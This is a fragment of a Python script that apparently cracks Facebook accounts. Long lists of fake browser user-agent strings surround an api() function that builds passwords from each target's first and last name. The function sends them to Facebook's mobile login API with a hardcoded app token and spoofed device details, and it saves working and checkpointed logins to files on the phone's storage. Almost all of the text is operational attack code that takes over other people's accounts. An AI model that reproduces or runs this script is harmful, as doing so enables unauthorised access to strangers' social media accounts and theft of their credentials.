Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4449500601859280519 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v367206437094201971 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3066835575078036435 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3266273621406942610 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1250236672198056353 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082608048 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3979041257279714446 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v322668214549461212 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4609835013625307970 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082617957 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4646618880322607358 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1101787664153943098 t4803866639546985847 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082620604 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082623256 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v375189948583655177 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082631960 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v611542716886966475 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2915218711252450120 t7427258062421531350 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3211520740918824077 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2507470025944571643 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6446432870271605536 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082641868 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872917641 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082644513 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8655394166562125685 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082647164 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5783808878882613191 t1403586453951734988 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5973385287437470177 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082655861 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5765380714054028115 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872972448 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v4795863969001110694 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8623367250540758263 t1029548762767996041 ath4b3726d5 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082665773 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v4702127043683762060 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082668416 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082671069 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v170631396672377548 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v5315532114365840275 t5523802693953152063 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7022494431548398899 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8755093989051549016 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082679762 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8873054857 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5608863896674994816 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2621450297721286890 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082689678 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4865191788498561634 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082692451 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082694976 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4426134885908612106 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8873109914 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3711573451780061506 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082703666 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v1104569554869804706 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3780631651033185342 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082713576 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082716218 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6973343386087183823 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082718869 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8873189691 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6329702194744501969 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3651412523064277149 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3027492994058057893 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3408068943358951802 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082726907 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6850888285365560323 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6583412278583605259 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082736811 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6832269618617212966 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3211583470206979751 t4803866639546985847 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082739459 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082742113 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3896069416479016690 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082750816 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
"""
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [\033[1;32mZUHAIB\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ua = '[FBAN/FB4A;FBAV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ZUHAIB-OK] '+ids+' √ '+pas+'\033[1;97m')
                                        open('/sdcard/ZUHAIB-OK.txt','a').write(ids+'√'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;36m[ZUHAIB-2F] '+ids+' ~ '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;37m [ZUHAIB-CP] '+ids+' + '+pas+'\033[1;97m')
                                                open('/sdcard/ZUHAIB-CP.txt','a').write(ids+'+'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ZUHAIB-CP.txt','a').write(ids+'+'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
user="""
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3703914388514982487 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1522624600950985189 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082451959 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082454602 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082457257 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7878664985507590752 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3362914098297791158 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872290439 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082465947 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4176339355301370756 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5428479102736810377 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7863938640015126194 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082475857 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082478499 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v7432867588807617964 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082481149 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872370131 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v80611155147806793 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v5719892281019410869 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2981337680027881500 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4056229610255737633 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082489188 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8539436187412284615 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5077499483376554604 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082499092 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8733830533197110641 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3544777580198539289 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
